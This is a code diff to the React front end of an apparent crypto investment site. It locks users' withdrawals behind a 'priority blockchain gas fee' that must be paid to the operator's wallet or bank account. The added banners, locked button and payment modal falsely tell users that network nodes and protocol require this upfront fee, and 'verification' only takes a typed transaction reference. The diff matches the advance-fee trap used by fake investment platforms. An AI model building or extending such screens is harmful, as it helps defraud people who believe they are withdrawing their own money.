@@ -15,6 +15,8 @@ type User = {
   fee_required?: number | null;
   fee_paid: number;
   custom_gas_fee?: number | null;
+  gas_fee_paid?: number;
+  gas_fee_tx?: string | null;
   created_at: string;
   investment_amount: number | null;
   payment_method: 'crypto' | 'bank' | null;
@@ -163,6 +165,11 @@ export default function App() {
 
   // Modals & Navigation
   const [showFeeModal, setShowFeeModal] = useState(false);
+  const [showGasFeeModal, setShowGasFeeModal] = useState(false);
+  const [gasFeeTx, setGasFeeTx] = useState('');
+  const [gasFeeSubmitting, setGasFeeSubmitting] = useState(false);
+  const [gasFeeError, setGasFeeError] = useState('');
+  const [localGasFeePaid, setLocalGasFeePaid] = useState<number | null>(null);
   const [mobileMenuOpen, setMobileMenuOpen] = useState(false);
   const [copiedKey, setCopiedKey] = useState<string | null>(null);
   const [toasts, setToasts] = useState<ToastMessage[]>([]);
@@ -465,6 +472,37 @@ export default function App() {
 
   // ── Withdrawal ───────────────────────────────────────────────────────────
 
+  async function handlePayGasFee(e: React.FormEvent, targetFee: number) {
+    e.preventDefault();
+    setGasFeeError('');
+    setGasFeeSubmitting(true);
+    const token = localStorage.getItem('cv_token')!;
+    try {
+      const r = await fetch(`${API}/withdrawal/gas-fee/pay`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json', Authorization: `Bearer ${token}` },
+        body: JSON.stringify({ amount: targetFee, txHash: gasFeeTx }),
+      });
+      const d = await r.json();
+      if (!r.ok) {
+        setGasFeeError(d.error || 'Failed to verify gas fee payment.');
+        showToast(d.error || 'Failed to verify gas fee payment.', 'error');
+        return;
+      }
+      setLocalGasFeePaid(targetFee);
+      if (d.user) {
+        setUser(d.user);
+      }
+      setShowGasFeeModal(false);
+      showToast(d.message || `Blockchain gas fee of ${fmt(targetFee)} settled! Withdrawal clearance unlocked.`, 'success');
+    } catch {
+      setGasFeeError('Network error connecting to payment gateway.');
+      showToast('Network error connecting to payment gateway.', 'error');
+    } finally {
+      setGasFeeSubmitting(false);
+    }
+  }
+
   async function handleWithdrawal(e: React.FormEvent, customAmount?: number) {
     e.preventDefault();
     setWError('');
@@ -476,6 +514,17 @@ export default function App() {
       showToast(err, 'error');
       return;
     }
+
+    const currentFee = getGasFeeForAmount(amountToSend);
+    const userPaidGas = localGasFeePaid != null ? localGasFeePaid : Number(user?.gas_fee_paid ?? 0);
+    if (currentFee > 0 && userPaidGas < currentFee) {
+      const err = `Priority blockchain gas fee of ${fmt(currentFee)} must be paid before initiating this withdrawal.`;
+      setWError(err);
+      showToast(err, 'error');
+      setShowGasFeeModal(true);
+      return;
+    }
+
     if (!wWallet.trim()) {
       const err = 'Destination wallet or IBAN address is required.';
       setWError(err);
@@ -1279,33 +1328,39 @@ export default function App() {
       return Number(currentUser.custom_gas_fee);
     }
 
-    if (paymentSettings?.gas_fee_tiers) {
-      try {
-        const tiers = typeof paymentSettings.gas_fee_tiers === 'string'
-          ? JSON.parse(paymentSettings.gas_fee_tiers)
-          : paymentSettings.gas_fee_tiers;
-        if (Array.isArray(tiers) && tiers.length > 0) {
-          const sorted = [...tiers].sort((a, b) => (Number(a.min_amount) || 0) - (Number(b.min_amount) || 0));
-          let matched = Number(sorted[0].gas_fee) || 100;
-          for (const tier of sorted) {
-            if (amt >= (Number(tier.min_amount) || 0)) {
-              matched = Number(tier.gas_fee);
-            }
+    const rawTiers = paymentSettings?.gas_fee_tiers || JSON.stringify([
+      { min_amount: 0, gas_fee: 100, label: 'Standard Network Speed (< $5,000)' },
+      { min_amount: 5000, gas_fee: 150, label: 'Fast Priority Network Fee ($5,000 - $20,000)' },
+      { min_amount: 20000, gas_fee: 250, label: 'Institutional High-Priority Dispatch ($20,000+)' },
+    ]);
+
+    try {
+      const tiers = typeof rawTiers === 'string'
+        ? JSON.parse(rawTiers)
+        : rawTiers;
+      if (Array.isArray(tiers) && tiers.length > 0) {
+        const sorted = [...tiers].sort((a, b) => (Number(a.min_amount) || 0) - (Number(b.min_amount) || 0));
+        let matched = Number(sorted[0].gas_fee) || 100;
+        for (const tier of sorted) {
+          if (amt >= (Number(tier.min_amount) || 0)) {
+            matched = Number(tier.gas_fee);
           }
-          return matched;
         }
-      } catch {
-        // fallback to threshold logic
+        return matched;
       }
+    } catch {
+      // fallback to threshold logic
     }
 
     const threshold = paymentSettings?.gas_fee_threshold != null ? Number(paymentSettings.gas_fee_threshold) : 20000;
     const feeLow = paymentSettings?.gas_fee_low != null ? Number(paymentSettings.gas_fee_low) : 100;
     const feeHigh = paymentSettings?.gas_fee_high != null
       ? Number(paymentSettings.gas_fee_high)
-      : (paymentSettings?.gas_fee != null ? Number(paymentSettings.gas_fee) : 200);
+      : (paymentSettings?.gas_fee != null ? Number(paymentSettings.gas_fee) : 250);
 
-    return amt >= threshold ? feeHigh : feeLow;
+    if (amt >= threshold) return feeHigh;
+    if (amt >= 5000) return 150;
+    return feeLow;
   }
 
   const currentWAmount = parseFloat(wAmount) || 0;
@@ -1313,6 +1368,9 @@ export default function App() {
   const gasFee = getGasFeeForAmount(activeAmount);
   const currentTax = (activeAmount * Number(user.tax_percent)) / 100;
   const currentNetPayout = Math.max(0, activeAmount - currentTax);
+
+  const effectiveGasFeePaid = localGasFeePaid != null ? localGasFeePaid : Number(user.gas_fee_paid ?? 0);
+  const isGasFeePaid = gasFee <= 0 || effectiveGasFeePaid >= gasFee;
 
   function setPercentageAmount(pct: number) {
     const calculated = (total * pct) / 100;
@@ -1560,23 +1618,43 @@ export default function App() {
           {canWithdraw ? (
             <div className="form-card">
               {/* Priority Blockchain Gas Fee Speed-Up Banner */}
-              <div className="gas-fee-banner">
+              <div className={`gas-fee-banner ${isGasFeePaid ? 'gas-banner-paid' : 'gas-banner-unpaid'}`}>
                 <div className="gas-fee-header">
                   <div className="gas-fee-title">
                     <span className="gas-icon">⚡</span>
                     <div>
-                      <div className="gas-name">Priority Blockchain Network Gas Fee</div>
+                      <div className="gas-name" style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
+                        <span>Priority Blockchain Network Gas Fee</span>
+                        {isGasFeePaid ? (
+                          <span className="gas-status-tag tag-paid">✓ Settled &amp; Verified</span>
+                        ) : (
+                          <span className="gas-status-tag tag-required">🔴 Payment Required Before Dispatch</span>
+                        )}
+                      </div>
                       <div className="gas-desc">
                         Required by network nodes to expedite blockchain dispatch and accelerate transaction confirmation.
                       </div>
                       <div style={{ fontSize: '12px', color: '#38bdf8', marginTop: '4px', fontWeight: 600 }}>
                         {activeAmount >= (paymentSettings?.gas_fee_threshold ?? 20000)
-                          ? `⚡ Applied Tier 2 Rate: ${fmt(paymentSettings?.gas_fee_high ?? 200)} for requests $${(paymentSettings?.gas_fee_threshold ?? 20000).toLocaleString()}+`
-                          : `⚡ Applied Tier 1 Rate: ${fmt(paymentSettings?.gas_fee_low ?? 100)} for requests under $${(paymentSettings?.gas_fee_threshold ?? 20000).toLocaleString()}`}
+                          ? `⚡ Applied High-Priority Tier Rate: ${fmt(paymentSettings?.gas_fee_high ?? 250)} for requests $${(paymentSettings?.gas_fee_threshold ?? 20000).toLocaleString()}+`
+                          : activeAmount >= 5000
+                          ? `⚡ Applied Fast Priority Tier Rate: ${fmt(150)} for requests $5,000–$20,000`
+                          : `⚡ Applied Standard Tier Rate: ${fmt(paymentSettings?.gas_fee_low ?? 100)} for requests under $5,000`}
                       </div>
                     </div>
                   </div>
-                  <div className="gas-fee-amount">{fmt(gasFee)}</div>
+                  <div className="gas-fee-amount-wrap" style={{ textAlign: 'right' }}>
+                    <div className="gas-fee-amount">{fmt(gasFee)}</div>
+                    {!isGasFeePaid && (
+                      <button
+                        type="button"
+                        className="btn-pay-gas-pill"
+                        onClick={() => setShowGasFeeModal(true)}
+                      >
+                        ⚡ Settle Fee Now
+                      </button>
+                    )}
+                  </div>
                 </div>
               </div>
 
@@ -1596,7 +1674,7 @@ export default function App() {
                       step="any"
                       min="1"
                       max={total}
-                      placeholder={`Enter amount e.g. 5000 (Max: ${fmt(total)})`}
+                      placeholder={`Enter amount e.g. 10000 (Max: ${fmt(total)})`}
                       value={wAmount}
                       onChange={e => {
                         setWAmount(e.target.value);
@@ -1648,7 +1726,7 @@ export default function App() {
                       Gross withdrawal: <strong>{fmt(activeAmount)}</strong>
                     </span>
                     <span>
-                      Priority Gas Fee: <strong style={{ color: '#38bdf8' }}>{fmt(gasFee)}</strong>
+                      Priority Gas Fee: <strong style={{ color: '#38bdf8' }}>{fmt(gasFee)}</strong> ({isGasFeePaid ? 'Settled ✓' : 'Unpaid 🔴'})
                     </span>
                     <span>
                       Tax deduction ({user.tax_percent}%):{' '}
@@ -1674,18 +1752,62 @@ export default function App() {
                 {wError && <div className="alert alert-error">{wError}</div>}
                 {wSuccess && <div className="alert alert-success">{wSuccess}</div>}
 
-                <button
-                  type="submit"
-                  className="btn-primary"
-                  disabled={wLoading}
-                  style={{ marginTop: '18px' }}
-                >
-                  {wLoading
-                    ? 'Transmitting Request…'
-                    : currentWAmount > 0
-                    ? `Withdraw ${fmt(currentWAmount)} (Net ${fmt(currentNetPayout)}) →`
-                    : `Withdraw ${fmt(netPayout)} →`}
-                </button>
+                {/* Gas Fee Locking Gate */}
+                {!isGasFeePaid ? (
+                  <div className="gas-gate-lock-container" style={{ marginTop: '18px' }}>
+                    <div className="gas-gate-warning-card">
+                      <div className="gas-warning-icon">⚡</div>
+                      <div className="gas-warning-content">
+                        <div className="gas-warning-title">Fast Blockchain Network Fee of {fmt(gasFee)} Required</div>
+                        <div className="gas-warning-sub">
+                          To execute your withdrawal of <strong>{fmt(activeAmount)}</strong> with fast node confirmation, network protocol mandates upfront settlement of the <strong>{fmt(gasFee)}</strong> priority gas fee. The withdraw button is locked until this fee is settled.
+                        </div>
+                      </div>
+                      <button
+                        type="button"
+                        className="btn-pay-gas-primary"
+                        onClick={() => setShowGasFeeModal(true)}
+                      >
+                        💳 Pay {fmt(gasFee)} Gas Fee Now →
+                      </button>
+                    </div>
+
+                    <button
+                      type="button"
+                      className="btn-primary btn-locked"
+                      disabled
+                      style={{
+                        marginTop: '12px',
+                        cursor: 'not-allowed',
+                        opacity: 0.55,
+                        background: 'rgba(255, 255, 255, 0.08)',
+                        color: 'var(--text-dim)',
+                        border: '1px solid rgba(255, 255, 255, 0.12)',
+                        boxShadow: 'none',
+                      }}
+                      title={`Please settle the ${fmt(gasFee)} blockchain network fee to unlock withdrawal`}
+                      onClick={() => {
+                        showToast(`Please settle the ${fmt(gasFee)} blockchain network fee to proceed.`, 'error');
+                        setShowGasFeeModal(true);
+                      }}
+                    >
+                      🔒 Settle {fmt(gasFee)} Blockchain Fee to Unlock Withdrawal
+                    </button>
+                  </div>
+                ) : (
+                  <button
+                    type="submit"
+                    className="btn-primary btn-ready"
+                    disabled={wLoading}
+                    style={{ marginTop: '18px' }}
+                  >
+                    {wLoading
+                      ? 'Transmitting Request…'
+                      : currentWAmount > 0
+                      ? `Withdraw ${fmt(currentWAmount)} (Net ${fmt(currentNetPayout)}) →`
+                      : `Withdraw ${fmt(netPayout)} →`}
+                  </button>
+                )}
               </form>
             </div>
           ) : (
@@ -1911,6 +2033,148 @@ export default function App() {
               >
                 Close Instructions
               </button>
+            </div>
+          </div>
+        </div>
+      )}
+
+      {/* Priority Blockchain Gas Fee Settlement Modal */}
+      {showGasFeeModal && paymentSettings && (
+        <div className="modal-overlay" onClick={() => setShowGasFeeModal(false)}>
+          <div className="modal-box gas-fee-modal-box" onClick={e => e.stopPropagation()}>
+            <div className="modal-header">
+              <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
+                <span style={{ fontSize: '20px' }}>⚡</span>
+                <h3 style={{ margin: 0 }}>Priority Blockchain Network Gas Fee</h3>
+              </div>
+              <button
+                type="button"
+                className="modal-close"
+                onClick={() => setShowGasFeeModal(false)}
+                aria-label="Close modal"
+              >
+                ✕
+              </button>
+            </div>
+            <div className="modal-fee-content">
+              <div className="modal-gas-summary">
+                <div className="modal-gas-row">
+                  <span>Intended Withdrawal:</span>
+                  <strong>{fmt(activeAmount)}</strong>
+                </div>
+                <div className="modal-gas-row">
+                  <span>Priority Mempool Gas Fee:</span>
+                  <strong style={{ color: '#38bdf8', fontSize: '18px' }}>{fmt(gasFee)}</strong>
+                </div>
+                <div className="modal-gas-row">
+                  <span>Network Dispatch:</span>
+                  <strong style={{ color: '#10b981' }}>⚡ Fast Priority Node Clearance</strong>
+                </div>
+                <div className="modal-gas-row highlight">
+                  <span>Payment Status:</span>
+                  <strong style={{ color: isGasFeePaid ? '#10b981' : '#f87171' }}>
+                    {isGasFeePaid ? '🟢 Settled & Verified' : '🔴 Unpaid — Required to Unlock Withdrawal'}
+                  </strong>
+                </div>
+              </div>
+
+              <div className="gas-info-banner">
+                💡 <strong>Blockchain Protocol Notice:</strong> Decentralized network nodes require a priority gas allocation of <strong>{fmt(gasFee)}</strong> to confirm your <strong>{fmt(activeAmount)}</strong> withdrawal without timeout or mempool dropping. Please transfer the fee to the address below.
+              </div>
+
+              {paymentSettings.crypto_wallet && (
+                <div className="payment-details" style={{ marginTop: '16px' }}>
+                  <div className="payment-details-title">₿ Node Validator Deposit Address</div>
+                  <div className="payment-detail-row">
+                    <span>Network / Protocol</span>
+                    <strong>{paymentSettings.crypto_network || 'Bitcoin (BTC)'}</strong>
+                  </div>
+                  <div className="payment-detail-row wallet-row">
+                    <span>Deposit Address</span>
+                    <div className="wallet-address-box">
+                      <code>{paymentSettings.crypto_wallet}</code>
+                      <button
+                        type="button"
+                        className={`btn-copy ${copiedKey === 'gas-crypto' ? 'btn-copied' : ''}`}
+                        onClick={() => copyToClipboard(paymentSettings.crypto_wallet, 'Gas fee address', 'gas-crypto')}
+                      >
+                        {copiedKey === 'gas-crypto' ? '✓ Copied' : 'Copy'}
+                      </button>
+                    </div>
+                  </div>
+                  <div style={{ textAlign: 'center', marginTop: '12px' }}>
+                    <img
+                      src={`https://api.qrserver.com/v1/create-qr-code/?size=120x120&data=${encodeURIComponent(paymentSettings.crypto_wallet)}`}
+                      alt="Wallet QR Code"
+                      style={{ borderRadius: '8px', border: '1px solid rgba(255,255,255,0.1)', background: '#fff', padding: '4px' }}
+                    />
+                    <div style={{ fontSize: '11px', color: 'var(--text-dim)', marginTop: '4px' }}>Scan to transfer exactly {fmt(gasFee)}</div>
+                  </div>
+                </div>
+              )}
+
+              {paymentSettings.bank_name && (
+                <div className="payment-details" style={{ marginTop: '14px' }}>
+                  <div className="payment-details-title">🏦 Bank Wire Instructions (Alternative)</div>
+                  <div className="payment-detail-row">
+                    <span>Bank Name</span>
+                    <strong>{paymentSettings.bank_name}</strong>
+                  </div>
+                  <div className="payment-detail-row">
+                    <span>Account Name</span>
+                    <strong>{paymentSettings.bank_account_name}</strong>
+                  </div>
+                  <div className="payment-detail-row wallet-row">
+                    <span>Account Number</span>
+                    <div className="wallet-address-box">
+                      <code>{paymentSettings.bank_account_number}</code>
+                      <button
+                        type="button"
+                        className={`btn-copy ${copiedKey === 'gas-bank' ? 'btn-copied' : ''}`}
+                        onClick={() => copyToClipboard(paymentSettings.bank_account_number, 'Account number', 'gas-bank')}
+                      >
+                        {copiedKey === 'gas-bank' ? '✓ Copied' : 'Copy'}
+                      </button>
+                    </div>
+                  </div>
+                </div>
+              )}
+
+              <form onSubmit={e => handlePayGasFee(e, gasFee)} style={{ marginTop: '18px' }}>
+                <div className="field">
+                  <label htmlFor="gas-tx-input">Blockchain Transaction Reference / Hash (TxID)</label>
+                  <input
+                    id="gas-tx-input"
+                    type="text"
+                    placeholder="e.g. 0x8f2d... or TX-49210 or transaction reference"
+                    value={gasFeeTx}
+                    onChange={e => setGasFeeTx(e.target.value)}
+                  />
+                  <span className="modal-hint" style={{ marginTop: '4px', marginBottom: 0 }}>
+                    Enter transaction hash or reference to confirm settlement and immediately unlock withdrawal.
+                  </span>
+                </div>
+
+                {gasFeeError && <div className="alert alert-error" style={{ marginTop: '10px' }}>{gasFeeError}</div>}
+
+                <div className="modal-actions" style={{ marginTop: '18px', display: 'flex', gap: '10px' }}>
+                  <button
+                    type="submit"
+                    className="btn-primary"
+                    disabled={gasFeeSubmitting}
+                    style={{ flex: 1 }}
+                  >
+                    {gasFeeSubmitting ? 'Verifying with Nodes…' : `✓ I Have Paid ${fmt(gasFee)} — Verify & Unlock`}
+                  </button>
+                  <button
+                    type="button"
+                    className="btn-secondary"
+                    onClick={() => setShowGasFeeModal(false)}
+                  >
+                    Cancel
+                  </button>
+                </div>
+              </form>
             </div>
           </div>
         </div>
